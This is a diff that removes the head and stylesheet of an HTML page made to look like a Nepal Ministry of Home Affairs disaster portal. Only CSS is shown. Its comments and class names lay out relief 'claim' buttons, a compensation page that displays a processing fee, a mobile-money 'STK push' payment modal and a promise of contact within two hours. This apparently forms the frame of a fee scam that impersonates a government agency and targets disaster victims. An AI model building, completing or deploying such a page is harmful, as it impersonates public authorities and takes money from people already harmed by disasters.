@@ -1,2267 +1,1000 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Nepal Disaster Risk Reduction Portal | Ministry of Home Affairs</title>
-  <style>
-    /* Reset & Base Fonts */
-    *, *::before, *::after {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      color: #333333;
-      background-color: #f2f2f2;
-      line-height: 1.4;
-      font-size: 13px;
-    }
-
-    a {
-      color: #0b66c3;
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
-
-    .portal-container {
-      width: 100%;
-      max-width: 1340px;
-      margin: 0 auto;
-      background-color: #ffffff;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      min-height: 100vh;
-    }
-
-    /* Top Government Header */
-    .gov-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 10px 24px;
-      background-color: #ffffff;
-      border-bottom: 1px solid #eaeaea;
-    }
-
-    .gov-branding {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-    }
-
-    .gov-emblem {
-      width: 78px;
-      height: 78px;
-      object-fit: contain;
-      filter: drop-shadow(0 1px 2px rgba(0,0,0,0.15));
-    }
-
-    .gov-text h2 {
-      font-size: 18px;
-      color: #990000;
-      font-weight: 700;
-      margin-bottom: 2px;
-      letter-spacing: -0.2px;
-    }
-
-    .gov-text h1 {
-      font-size: 20px;
-      color: #0b66c3;
-      font-weight: 700;
-      margin-bottom: 2px;
-    }
-
-    .gov-text p {
-      font-size: 14px;
-      color: #222222;
-      font-weight: 500;
-    }
-
-    .gov-flag-box {
-      display: flex;
-      align-items: center;
-    }
-
-    .gov-flag {
-      width: 58px;
-      height: 70px;
-      object-fit: contain;
-      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
-    }
-
-    /* Main Blue Navigation Bar */
-    .main-nav {
-      background: linear-gradient(180deg, #1f78d1 0%, #1066c0 100%);
-      border-top: 1px solid #0a56a4;
-      border-bottom: 1px solid #094b8f;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 16px;
-      flex-wrap: wrap;
-    }
-
-    .nav-links {
-      display: flex;
-      list-style: none;
-      align-items: center;
-      flex-wrap: wrap;
-    }
-
-    .nav-links li {
-      position: relative;
-    }
-
-    .nav-links a {
-      display: block;
-      padding: 10px 14px;
-      color: #ffffff;
-      font-size: 13.5px;
-      font-weight: 600;
-      white-space: nowrap;
-      transition: background-color 0.15s ease;
-    }
-
-    .nav-links a:hover,
-    .nav-links li.active a {
-      background-color: #0b54a0;
-      text-decoration: none;
-    }
-
-    .nav-dropdown-caret {
-      font-size: 9px;
-      margin-left: 4px;
-      vertical-align: middle;
-      opacity: 0.9;
-    }
-
-    .nav-claim-highlight {
-      background: #e65100 !important;
-      color: #ffffff !important;
-      font-weight: 700 !important;
-      border-radius: 4px;
-      margin: 4px 6px;
-      padding: 7px 14px !important;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-      animation: pulseAlert 2.5s infinite;
-      cursor: pointer;
-    }
-    .nav-claim-highlight:hover {
-      background: #d84315 !important;
-    }
-
-    @keyframes pulseAlert {
-      0% { box-shadow: 0 0 0 0 rgba(230, 81, 0, 0.7); }
-      70% { box-shadow: 0 0 0 8px rgba(230, 81, 0, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(230, 81, 0, 0); }
-    }
-
-    /* Major Updates Ticker */
-    .ticker-section {
-      margin: 10px 16px;
-      border: 1px solid #ff4d4f;
-      background-color: #ffffff;
-      display: flex;
-      align-items: stretch;
-      min-height: 84px;
-    }
-
-    .ticker-title {
-      background-color: #ffffff;
-      color: #0b559f;
-      font-weight: 800;
-      font-size: 14px;
-      width: 175px;
-      min-width: 175px;
-      padding: 12px 14px;
-      border-right: 1.5px solid #ff4d4f;
-      display: flex;
-      align-items: center;
-      letter-spacing: 0.3px;
-    }
-
-    .ticker-content {
-      padding: 8px 16px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      gap: 5px;
-      font-size: 13.5px;
-      overflow: hidden;
-    }
-
-    .ticker-content a {
-      color: #0b66c3;
-      text-decoration: none;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-    .ticker-content a:hover {
-      text-decoration: underline;
-    }
-
-    .ticker-hotline {
-      color: #0b66c3;
-      font-weight: 600;
-    }
-
-    /* ==========================================================================
-       HIGH-VISIBILITY EMERGENCY QUICK-ACTION RELIEF BUTTON STRIP
-       ========================================================================== */
-    .emergency-strip-container {
-      margin: 0 16px 12px 16px;
-      background: #ffffff;
-      border: 2px solid #0b66c3;
-      border-radius: 6px;
-      padding: 10px 14px;
-      box-shadow: 0 3px 8px rgba(11, 102, 195, 0.12);
-    }
-
-    .emergency-strip-heading {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 8px;
-      flex-wrap: wrap;
-      gap: 6px;
-    }
-
-    .strip-title-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background-color: #d32f2f;
-      color: #ffffff;
-      font-size: 12px;
-      font-weight: 800;
-      padding: 4px 10px;
-      border-radius: 4px;
-      letter-spacing: 0.4px;
-      text-transform: uppercase;
-    }
-
-    .strip-subtitle {
-      font-size: 12.5px;
-      font-weight: 600;
-      color: #475569;
-    }
-
-    .emergency-buttons-row {
-      display: grid;
-      grid-template-columns: repeat(5, 1fr);
-      gap: 8px;
-    }
-
-    /* Enhanced 3D Action Push Buttons */
-    .action-push-btn {
-      border: none;
-      border-radius: 8px;
-      padding: 12px 10px;
-      cursor: pointer;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      color: #ffffff;
-      text-align: center;
-      font-family: inherit;
-      transition: all 0.12s ease-in-out;
-      position: relative;
-      user-select: none;
-    }
-
-    .action-push-btn:hover {
-      transform: translateY(-2px);
-      filter: brightness(1.08);
-    }
-
-    .action-push-btn:active {
-      transform: translateY(3px) !important;
-    }
-
-    .btn-theme-landslide {
-      background: linear-gradient(180deg, #e53935 0%, #b71c1c 100%);
-      border: 1px solid #b71c1c;
-      border-bottom: 4px solid #7f0000;
-      box-shadow: 0 4px 8px rgba(183, 28, 28, 0.35);
-    }
-    .btn-theme-landslide:active {
-      border-bottom: 1px solid #7f0000;
-      box-shadow: 0 1px 3px rgba(183, 28, 28, 0.4);
-    }
-
-    .btn-theme-snakebite {
-      background: linear-gradient(180deg, #8e24aa 0%, #5c1682 100%);
-      border: 1px solid #4a148c;
-      border-bottom: 4px solid #31005c;
-      box-shadow: 0 4px 8px rgba(106, 27, 154, 0.35);
-    }
-    .btn-theme-snakebite:active {
-      border-bottom: 1px solid #31005c;
-      box-shadow: 0 1px 3px rgba(106, 27, 154, 0.4);
-    }
-
-    .btn-theme-fire {
-      background: linear-gradient(180deg, #f57c00 0%, #d84315 100%);
-      border: 1px solid #bf360c;
-      border-bottom: 4px solid #872300;
-      box-shadow: 0 4px 8px rgba(216, 67, 21, 0.35);
-    }
-    .btn-theme-fire:active {
-      border-bottom: 1px solid #872300;
-      box-shadow: 0 1px 3px rgba(216, 67, 21, 0.4);
-    }
-
-    .btn-theme-flood {
-      background: linear-gradient(180deg, #0288d1 0%, #01579b 100%);
-      border: 1px solid #014377;
-      border-bottom: 4px solid #002f54;
-      box-shadow: 0 4px 8px rgba(1, 87, 155, 0.35);
-    }
-    .btn-theme-flood:active {
-      border-bottom: 1px solid #002f54;
-      box-shadow: 0 1px 3px rgba(1, 87, 155, 0.4);
-    }
-
-    .btn-theme-rainfall {
-      background: linear-gradient(180deg, #00897b 0%, #004d40 100%);
-      border: 1px solid #00332c;
-      border-bottom: 4px solid #00201b;
-      box-shadow: 0 4px 8px rgba(0, 77, 64, 0.35);
-    }
-    .btn-theme-rainfall:active {
-      border-bottom: 1px solid #00201b;
-      box-shadow: 0 1px 3px rgba(0, 77, 64, 0.4);
-    }
-
-    .push-btn-top {
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      font-size: 14px;
-      font-weight: 800;
-    }
-
-    .push-btn-count {
-      background: rgba(255, 255, 255, 0.25);
-      border: 1px solid rgba(255,255,255,0.4);
-      padding: 1px 6px;
-      border-radius: 10px;
-      font-size: 11px;
-    }
-
-    .push-btn-claim-tag {
-      background: #ffffff;
-      color: #111827;
-      font-size: 10.5px;
-      font-weight: 800;
-      padding: 3px 8px;
-      border-radius: 12px;
-      letter-spacing: 0.3px;
-      text-transform: uppercase;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
-    }
-
-    /* 3-Column Middle Dashboard Layout */
-    .dashboard-grid {
-      display: grid;
-      grid-template-columns: 210px 1fr 390px;
-      gap: 16px;
-      padding: 4px 16px 16px 16px;
-    }
-
-    /* Left Sidebar: Reports */
-    .reports-sidebar {
-      background-color: #ffffff;
-      border: 1px solid #e0e0e0;
-      border-radius: 2px;
-      overflow: hidden;
-    }
-
-    .reports-header {
-      background: linear-gradient(180deg, #1a7ae2 0%, #0c62bd 100%);
-      color: #ffffff;
-      padding: 8px 14px;
-      font-size: 19px;
-      font-weight: 700;
-    }
-
-    .reports-list {
-      list-style: none;
-    }
-
-    .reports-list a {
-      display: block;
-      padding: 10px 14px;
-      background-color: #2187ec;
-      color: #ffffff;
-      font-size: 13px;
-      font-weight: 500;
-      border-bottom: 1px solid rgba(255,255,255,0.25);
-      transition: background-color 0.15s ease;
-    }
-
-    .reports-list a:hover {
-      background-color: #0c62bd;
-      text-decoration: none;
-    }
-
-    /* Center: Map of EOCs in Nepal */
-    .map-container {
-      background-color: #ffffff;
-      border: 1px solid #dcdcdc;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .map-header {
-      background-color: #1a7ae2;
-      color: #ffffff;
-      text-align: center;
-      padding: 8px 12px;
-      font-size: 17px;
-      font-weight: 700;
-      letter-spacing: 0.2px;
-    }
-
-    .map-body {
-      padding: 12px;
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: space-between;
-    }
-
-    .map-subtext {
-      text-align: center;
-      font-size: 11.5px;
-      color: #444;
-      margin-bottom: 8px;
-    }
-    .map-subtext strong {
-      color: #cc0000;
-      display: block;
-      font-size: 13px;
-    }
-
-    .nepal-svg-wrap {
-      width: 100%;
-      max-width: 580px;
-      height: auto;
-      margin: 8px 0;
-    }
-
-    .map-legend-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-end;
-      width: 100%;
-      font-size: 11px;
-      color: #555;
-      padding: 4px 6px;
-      border-top: 1px solid #eeeeee;
-    }
-
-    .map-legend-items {
-      display: flex;
-      flex-direction: column;
-      gap: 3px;
-    }
-
-    .legend-item {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .dot-neoc {
-      width: 8px;
-      height: 8px;
-      background-color: #cc0000;
-      border-radius: 50%;
-    }
-    .dot-peoc {
-      width: 8px;
-      height: 8px;
-      background-color: #8b0000;
-      border-radius: 2px;
-    }
-    .dot-deoc {
-      width: 8px;
-      height: 8px;
-      background-color: #f5a623;
-      border-radius: 50%;
-    }
-
-    .map-totals-bar {
-      font-size: 12px;
-      font-weight: 600;
-      color: #222;
-      text-align: center;
-      width: 100%;
-      padding-top: 6px;
-    }
-
-    /* Right Column: Reported Incidents */
-    .incidents-summary-box {
-      border: 1px solid #dcdcdc;
-      background-color: #ffffff;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .incidents-header {
-      background-color: #e60000;
-      color: #ffffff;
-      padding: 8px 12px;
-      font-size: 16px;
-      font-weight: 700;
-      text-align: center;
-      letter-spacing: 0.2px;
-    }
-
-    .incidents-action-notice {
-      background: #fff8e1;
-      border-bottom: 1px solid #ffe082;
-      padding: 6px 10px;
-      font-size: 11.5px;
-      color: #856404;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .incidents-buttons-grid {
-      padding: 8px;
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-    }
-
-    .sidebar-btn-featured {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      background: linear-gradient(180deg, #d32f2f 0%, #b71c1c 100%);
-      color: #ffffff;
-      border: 1px solid #b71c1c;
-      border-bottom: 4px solid #7f0000;
-      border-radius: 8px;
-      padding: 12px 14px;
-      cursor: pointer;
-      transition: all 0.12s ease-in-out;
-      box-shadow: 0 4px 8px rgba(183, 28, 28, 0.35);
-      width: 100%;
-      text-align: left;
-      user-select: none;
-    }
-
-    .sidebar-btn-featured:hover {
-      transform: translateY(-2px);
-      filter: brightness(1.08);
-    }
-
-    .sidebar-btn-featured:active {
-      transform: translateY(3px) !important;
-      border-bottom: 1px solid #7f0000;
-      box-shadow: 0 1px 3px rgba(183, 28, 28, 0.4);
-    }
-
-    .sidebar-sub-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 8px;
-    }
-
-    .sidebar-btn-tile {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 5px;
-      border-radius: 8px;
-      padding: 10px 8px;
-      cursor: pointer;
-      transition: all 0.12s ease-in-out;
-      text-align: center;
-      width: 100%;
-      color: #ffffff;
-      user-select: none;
-    }
-
-    .sidebar-btn-tile:hover {
-      transform: translateY(-2px);
-      filter: brightness(1.08);
-    }
-
-    .sidebar-btn-tile:active {
-      transform: translateY(3px) !important;
-    }
-
-    .sidebar-all-claims-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      width: 100%;
-      background: linear-gradient(180deg, #f57c00 0%, #e65100 100%);
-      color: #ffffff;
-      font-size: 12px;
-      font-weight: 800;
-      padding: 10px 12px;
-      border: 1px solid #bf360c;
-      border-bottom: 3px solid #872300;
-      border-radius: 6px;
-      cursor: pointer;
-      text-transform: uppercase;
-      letter-spacing: 0.3px;
-      box-shadow: 0 3px 6px rgba(230, 81, 0, 0.3);
-      transition: all 0.12s ease-in-out;
-      margin-top: 4px;
-    }
-
-    .sidebar-all-claims-btn:hover {
-      transform: translateY(-1px);
-      filter: brightness(1.08);
-      box-shadow: 0 5px 10px rgba(230, 81, 0, 0.4);
-    }
-
-    .sidebar-all-claims-btn:active {
-      transform: translateY(2px);
-      border-bottom: 1px solid #872300;
-    }
-
-    /* Filter & Search Bar */
-    .filter-bar {
-      background-color: #f4f4f4;
-      border-top: 1px solid #e0e0e0;
-      border-bottom: 1px solid #e0e0e0;
-      padding: 10px 16px;
-      display: flex;
-      align-items: flex-end;
-      gap: 10px;
-      flex-wrap: wrap;
-    }
-
-    .filter-group {
-      display: flex;
-      flex-direction: column;
-      gap: 3px;
-    }
-
-    .filter-group label {
-      font-size: 12px;
-      font-weight: 700;
-      color: #222222;
-    }
-
-    .filter-group select,
-    .filter-group input {
-      height: 28px;
-      padding: 3px 8px;
-      font-size: 12px;
-      border: 1px solid #cccccc;
-      border-radius: 2px;
-      background-color: #ffffff;
-      min-width: 130px;
-      color: #333;
-    }
-
-    .filter-group select:focus,
-    .filter-group input:focus {
-      outline: none;
-      border-color: #0b66c3;
-    }
-
-    .filter-actions {
-      display: flex;
-      gap: 6px;
-      margin-left: auto;
-    }
-
-    .btn-portal-blue {
-      background-color: #1b75bb;
-      color: #ffffff;
-      border: 1px solid #14598e;
-      padding: 4px 14px;
-      font-size: 12px;
-      font-weight: 600;
-      border-radius: 2px;
-      cursor: pointer;
-      height: 28px;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      transition: background 0.15s ease;
-    }
-
-    .btn-portal-blue:hover {
-      background-color: #13598f;
-    }
-
-    /* Incident Data Table */
-    .table-container {
-      width: 100%;
-      overflow-x: auto;
-      padding: 0 16px 24px 16px;
-      background-color: #ffffff;
-    }
-
-    .incidents-table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 11.5px;
-      text-align: left;
-      margin-top: 10px;
-    }
-
-    .incidents-table th {
-      background-color: #f26522;
-      color: #ffffff;
-      font-weight: 700;
-      padding: 8px 6px;
-      border: 1px solid #e05515;
-      white-space: normal;
-      vertical-align: middle;
-      line-height: 1.25;
-    }
-
-    .incidents-table td {
-      padding: 7px 6px;
-      border: 1px solid #e5e5e5;
-      color: #333333;
-      white-space: nowrap;
-    }
-
-    .incidents-table tbody tr:nth-child(even) {
-      background-color: #fafafa;
-    }
-
-    .incidents-table tbody tr:hover {
-      background-color: #fff8f0;
-    }
-
-    .incidents-table .total-row td {
-      font-weight: 800;
-      color: #0b559f;
-      border-top: 2px solid #0b559f;
-      background-color: #f7faff;
-    }
-
-    /* ==========================================================================
-       PAGE 2: FINANCIAL ASSISTANCE (CLEAN 6-COLUMN FINANCE TERMS TABLE)
-       ========================================================================== */
-    #page-claim {
-      display: none;
-      padding: 16px 24px 36px 24px;
-      background-color: #ffffff;
-    }
-
-    .claim-top-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding-bottom: 14px;
-      border-bottom: 2px solid #0d6efd;
-      margin-bottom: 16px;
-      flex-wrap: wrap;
-      gap: 12px;
-    }
-
-    .btn-back-portal {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background-color: #ffffff;
-      color: #0d6efd;
-      border: 1.5px solid #0d6efd;
-      padding: 7px 16px;
-      border-radius: 4px;
-      font-size: 13px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-    .btn-back-portal:hover {
-      background-color: #0d6efd;
-      color: #ffffff;
-      text-decoration: none;
-    }
-
-    .claim-header-titles h2 {
-      font-size: 22px;
-      color: #990000;
-      font-weight: 800;
-    }
-    .claim-header-titles p {
-      font-size: 13px;
-      color: #555555;
-    }
-
-    /* Instant 1-Line Claim Confirmation Alert */
-    #instant-claim-banner {
-      display: none;
-      background: #e8f5e9;
-      border: 1.5px solid #2e7d32;
-      border-radius: 4px;
-      padding: 10px 14px;
-      margin-bottom: 16px;
-      color: #1b5e20;
-      font-size: 13px;
-      font-weight: 600;
-    }
-
-    /* Summary Metrics Strip */
-    .finance-metrics-bar {
-      display: flex;
-      justify-content: space-between;
-      background: #f8fafc;
-      border: 1px solid #e2e8f0;
-      border-radius: 6px;
-      padding: 12px 18px;
-      margin-bottom: 16px;
-      flex-wrap: wrap;
-      gap: 12px;
-    }
-
-    .f-metric {
-      display: flex;
-      flex-direction: column;
-    }
-    .f-metric-lbl {
-      font-size: 11px;
-      font-weight: 700;
-      color: #64748b;
-      text-transform: uppercase;
-    }
-    .f-metric-val {
-      font-size: 16px;
-      font-weight: 800;
-      color: #0f172a;
-    }
-
-    /* 6-Column Finance Table Section */
-    .six-col-table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 13px;
-      text-align: left;
-    }
-
-    .six-col-table th {
-      background: linear-gradient(180deg, #1f78d1 0%, #0d62be 100%);
-      color: #ffffff;
-      padding: 11px 14px;
-      font-weight: 700;
-      border: 1px solid #0b55a8;
-      vertical-align: middle;
-    }
-
-    .six-col-table td {
-      padding: 12px 14px;
-      border: 1px solid #e2e8f0;
-      vertical-align: middle;
-    }
-
-    .six-col-table tbody tr:nth-child(even) {
-      background-color: #f8fafc;
-    }
-
-    .six-col-table tbody tr:hover {
-      background-color: #fff9f4;
-    }
-
-    .amount-bold-col {
-      font-size: 17px;
-      font-weight: 800;
-      color: #0b66c3;
-    }
-
-    .figure-mono {
-      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-      font-size: 13.5px;
-      font-weight: 600;
-    }
-
-    /* Column 6: Just A Claim Button (No other statements) */
-    .btn-claim-only {
-      background: linear-gradient(180deg, #f26522 0%, #d84315 100%);
-      color: #ffffff;
-      border: 1px solid #bf360c;
-      border-bottom: 3px solid #872300;
-      border-radius: 5px;
-      padding: 7px 22px;
-      font-size: 13px;
-      font-weight: 800;
-      cursor: pointer;
-      box-shadow: 0 2px 5px rgba(216, 67, 21, 0.3);
-      transition: all 0.12s ease-in-out;
-      white-space: nowrap;
-      user-select: none;
-    }
-
-    .btn-claim-only:hover {
-      filter: brightness(1.1);
-      transform: translateY(-1px);
-      box-shadow: 0 4px 8px rgba(216, 67, 21, 0.4);
-    }
-
-    .btn-claim-only:active {
-      transform: translateY(2px);
-      border-bottom: 1px solid #872300;
-    }
-
-    .btn-claim-only.claimed {
-      background: #2e7d32 !important;
-      border: 1px solid #1b5e20 !important;
-      border-bottom: 1px solid #1b5e20 !important;
-      color: #ffffff !important;
-      cursor: default;
-      transform: none !important;
-      box-shadow: none !important;
-    }
-
-    /* ==========================================================================
-       PAGE 3: COMPENSATION CLAIM (Dark Grey Theme) - PROCESSING FEE SHOWN HERE
-       ========================================================================== */
-    #page-compensation {
-      display: none;
-      padding: 16px 24px 36px 24px;
-      background-color: #ffffff;
-    }
-
-    .comp-top-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding-bottom: 14px;
-      border-bottom: 2px solid #0d6efd;
-      margin-bottom: 16px;
-      flex-wrap: wrap;
-      gap: 12px;
-    }
-
-    .comp-header h2 {
-      font-size: 22px;
-      color: #990000;
-      font-weight: 800;
-    }
-    .comp-header p {
-      font-size: 13px;
-      color: #555555;
-    }
-
-    .comp-form-card {
-      background: linear-gradient(145deg, #2a2f3b 0%, #1a1e26 100%);
-      border: 1px solid #3a3f4b;
-      border-radius: 16px;
-      padding: 28px 30px;
-      max-width: 600px;
-      margin: 0 auto;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
-      color: #ffffff;
-    }
-
-    .comp-form-card .form-group {
-      margin-bottom: 20px;
-    }
-
-    .comp-form-card label {
-      display: block;
-      font-weight: 700;
-      font-size: 14px;
-      color: #e2e8f0;
-      margin-bottom: 6px;
-      letter-spacing: 0.3px;
-    }
-
-    .comp-form-card input[type="text"] {
-      width: 100%;
-      padding: 12px 16px;
-      border: 1px solid #4a4f5b;
-      border-radius: 8px;
-      font-size: 16px;
-      color: #ffffff;
-      background: rgba(255, 255, 255, 0.08);
-      backdrop-filter: blur(4px);
-      transition: border 0.2s, background 0.2s;
-    }
-
-    .comp-form-card input[type="text"]:focus {
-      outline: none;
-      border-color: #0b66c3;
-      background: rgba(255, 255, 255, 0.15);
-      box-shadow: 0 0 0 3px rgba(11, 102, 195, 0.3);
-    }
-
-    .comp-form-card input[type="text"]::placeholder {
-      color: #9ca3af;
-    }
-
-    /* Package summary on compensation page */
-    .package-summary {
-      background: rgba(255, 255, 255, 0.06);
-      border: 1px solid #4a4f5b;
-      border-radius: 8px;
-      padding: 12px 16px;
-      margin-bottom: 18px;
-      display: flex;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      gap: 8px;
-      font-size: 14px;
-    }
-    .package-summary .label {
-      color: #9ca3af;
-    }
-    .package-summary .value {
-      font-weight: 700;
-      color: #e2e8f0;
-    }
-
-    .comp-fee-display {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      background: rgba(255, 255, 255, 0.06);
-      padding: 12px 16px;
-      border-radius: 8px;
-      border: 1px solid #4a4f5b;
-      font-size: 18px;
-      font-weight: 600;
-      color: #e2e8f0;
-    }
-    .comp-fee-display .fee-amount {
-      color: #ffb74d;
-      font-size: 28px;
-      font-weight: 900;
-    }
-
-    .btn-pay-claim {
-      width: 100%;
-      padding: 16px;
-      background: linear-gradient(180deg, #1f78d1 0%, #0d62be 100%);
-      color: #ffffff;
-      border: none;
-      border-radius: 10px;
-      font-size: 20px;
-      font-weight: 800;
-      cursor: pointer;
-      transition: all 0.2s ease;
-      margin-top: 8px;
-      box-shadow: 0 4px 14px rgba(13, 98, 190, 0.4);
-    }
-
-    .btn-pay-claim:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(13, 98, 190, 0.5);
-    }
-
-    .btn-pay-claim:active {
-      transform: translateY(2px);
-    }
-
-    .btn-pay-claim:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-
-    /* ==========================================================================
-       PAGE 4: CONTACT PAGE (We will contact you within 2 hours)
-       ========================================================================== */
-    #contact-page {
-      display: none;
-      padding: 40px 24px;
-      text-align: center;
-      background: #ffffff;
-    }
-
-    #contact-page .contact-icon {
-      font-size: 64px;
-      margin-bottom: 16px;
-    }
-
-    #contact-page .contact-title {
-      font-size: 28px;
-      font-weight: 900;
-      color: #0b66c3;
-      margin-bottom: 8px;
-    }
-
-    #contact-page .contact-message {
-      font-size: 18px;
-      color: #1e293b;
-      margin-bottom: 6px;
-    }
-
-    #contact-page .contact-sub {
-      font-size: 15px;
-      color: #475569;
-    }
-
-    #contact-page .contact-btn {
-      margin-top: 20px;
-      display: inline-block;
-    }
-
-    /* ==========================================================================
-       STK PUSH MODAL (Real implementation)
-       ========================================================================== */
-    .stk-modal-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.8);
-      backdrop-filter: blur(6px);
-      z-index: 9999;
-      justify-content: center;
-      align-items: center;
-      animation: fadeIn 0.3s ease;
-    }
-
-    .stk-modal-overlay.active {
-      display: flex;
-    }
-
-    @keyframes fadeIn {
-      from { opacity:0; transform:scale(0.95); }
-      to { opacity:1; transform:scale(1); }
-    }
-
-    .stk-modal {
-      background: linear-gradient(145deg, #2a2f3b 0%, #1a1e26 100%);
-      border: 1px solid #4a4f5b;
-      border-radius: 20px;
-      padding: 32px 28px;
-      max-width: 440px;
-      width: 90%;
-      color: #ffffff;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
-      text-align: center;
-    }
-
-    .stk-modal .stk-icon {
-      font-size: 48px;
-      margin-bottom: 12px;
-    }
-
-    .stk-modal h3 {
-      font-size: 22px;
-      font-weight: 700;
-      margin-bottom: 6px;
-    }
-
-    .stk-modal .stk-amount {
-      font-size: 28px;
-      font-weight: 900;
-      color: #ffb74d;
-      display: block;
-      margin: 8px 0 16px 0;
-    }
-
-    .stk-modal .stk-status {
-      font-size: 16px;
-      color: #cbd5e1;
-      margin: 12px 0;
-      min-height: 28px;
-    }
-
-    .stk-modal .stk-status.success {
-      color: #4ade80;
-    }
-    .stk-modal .stk-status.error {
-      color: #f87171;
-    }
-
-    .stk-modal .stk-phone {
-      font-size: 14px;
-      color: #94a3b8;
-      margin-bottom: 16px;
-    }
-
-    .stk-modal .stk-phone strong {
-      color: #e2e8f0;
-    }
-
-    .stk-modal .stk-spinner {
-      display: inline-block;
-      width: 40px;
-      height: 40px;
-      border: 4px solid #3a3f4b;
-      border-top-color: #1f78d1;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      margin: 8px auto;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .stk-modal .stk-actions {
-      display: flex;
-      gap: 12px;
-      margin-top: 20px;
-    }
-
-    .stk-modal .stk-actions button {
-      flex: 1;
-      padding: 12px 0;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-
-    .stk-modal .stk-actions .btn-stk-confirm {
-      background: linear-gradient(180deg, #1f78d1 0%, #0d62be 100%);
-      color: #ffffff;
-      box-shadow: 0 4px 14px rgba(13, 98, 190, 0.4);
-    }
-
-    .stk-modal .stk-actions .btn-stk-confirm:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(13, 98, 190, 0.5);
-    }
-
-    .stk-modal .stk-actions .btn-stk-confirm:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-
-    .stk-modal .stk-actions .btn-stk-cancel {
-      background: #3a3f4b;
-      color: #e2e8f0;
-    }
-
-    .stk-modal .stk-actions .btn-stk-cancel:hover {
-      background: #4a4f5b;
-    }
-
-    .stk-modal .stk-actions .btn-stk-cancel:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-    }
-
-    .stk-modal .stk-timer {
-      font-size: 13px;
-      color: #94a3b8;
-      margin-top: 16px;
-      padding-top: 14px;
-      border-top: 1px solid #3a3f4b;
-    }
-
-    .stk-modal .stk-timer span {
-      color: #ffb74d;
-      font-weight: 700;
-    }
-
-    /* Toast for generic errors */
-    .toast {
-      position: fixed;
-      bottom: 30px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: #212529;
-      color: white;
-      padding: 12px 24px;
-      border-radius: 12px;
-      font-size: 0.85rem;
-      font-weight: 600;
-      z-index: 99999;
-      display: none;
-      max-width: 90%;
-      text-align: center;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-    }
-
-    .toast.show {
-      display: block;
-      animation: slideUp 0.3s ease;
-    }
-
-    @keyframes slideUp {
-      from { opacity:0; transform:translateX(-50%) translateY(20px); }
-      to { opacity:1; transform:translateX(-50%) translateY(0); }
-    }
-
-    /* Footer */
-    .portal-footer {
-      background-color: #263238;
-      color: #cfd8dc;
-      padding: 16px 24px;
-      text-align: center;
-      font-size: 12px;
-      border-top: 3px solid #0d6efd;
-    }
-
-    /* Responsive */
-    @media (max-width: 1024px) {
-      .dashboard-grid {
-        grid-template-columns: 1fr;
-      }
-      .emergency-buttons-row {
-        grid-template-columns: repeat(2, 1fr);
-      }
-      .filter-bar {
-        flex-direction: column;
-        align-items: stretch;
-      }
-      .filter-actions {
-        margin-left: 0;
-      }
-    }
-    @media (max-width: 600px) {
-      .emergency-buttons-row {
-        grid-template-columns: 1fr;
-      }
-      .gov-header {
-        flex-wrap: wrap;
-        gap: 8px;
-      }
-      .gov-branding {
-        flex-wrap: wrap;
-      }
-      .comp-form-card {
-        padding: 16px;
-      }
